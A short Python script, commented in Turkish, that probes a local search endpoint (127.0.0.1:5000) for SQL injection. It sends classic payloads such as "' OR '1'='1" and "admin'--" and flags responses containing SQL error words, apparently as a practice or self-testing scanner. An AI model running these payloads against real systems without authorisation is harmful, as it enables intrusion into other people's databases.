import requests

def sqli_tara(url, payloadlar, dosya):

    hata_mesajlari = [
        "sql",
        "mysql",
        "syntax",
        "error"
    ]

    with open(dosya, "w", encoding="utf-8") as f:

        for payload in payloadlar:

            try:
                cevap = requests.get(
                    url,
                    params={"q": payload},
                    timeout=5
                )

                sqli_var = any(
                    hata in cevap.text.lower()
                    for hata in hata_mesajlari
                )

                if sqli_var:
                    sonuc = f"[!] SQLi bulundu: {payload}"
                else:
                    sonuc = f"[+] Temiz: {payload}"

                print(sonuc)
                f.write(sonuc + "\n")

            except requests.RequestException as e:
                hata = f"[HATA] {payload} -> {e}"
                print(hata)
                f.write(hata + "\n")


url = "http://127.0.0.1:5000/search"

payloadlar = [
    "'",
    "' OR '1'='1",
    "' OR 1=1--",
    "admin'--",
    "normal_arama"
]

dosya = "sqli_rapor.txt"

sqli_tara(url, payloadlar, dosya)